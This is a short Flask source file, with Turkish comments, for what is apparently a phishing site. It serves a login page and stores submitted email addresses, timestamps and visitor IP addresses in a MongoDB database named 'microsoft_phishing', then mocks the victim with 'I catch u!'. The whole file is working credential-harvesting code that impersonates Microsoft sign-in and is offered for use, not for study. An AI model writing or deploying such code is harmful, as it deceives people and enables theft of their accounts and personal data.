from flask import Flask, render_template, request, jsonify, send_from_directory
import os
from pymongo import MongoClient
from datetime import datetime

app = Flask(__name__)

# MongoDB bağlantısı
MONGO_URI = "mongodb+srv://your_username:your_password@cluster0.mongodb.net/myFirstDatabase?retryWrites=true&w=majority"
client = MongoClient(MONGO_URI)
db = client['microsoft_phishing']
collection = db['emails']

@app.route('/', methods=['GET'])
def home():
    return render_template('login.html')

@app.route('/static/<path:filename>')
def serve_static(filename):
    root_dir = os.getcwd()
    return send_from_directory(os.path.join(root_dir, 'static'), filename)

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email', '')
    
    # MongoDB'ye kaydet
    collection.insert_one({
        'email': email,
        'timestamp': datetime.utcnow(),
        'ip': request.remote_addr
    })
    
    return jsonify({"message": "I catch u!"})

if __name__ == '__main__':
    app.run()
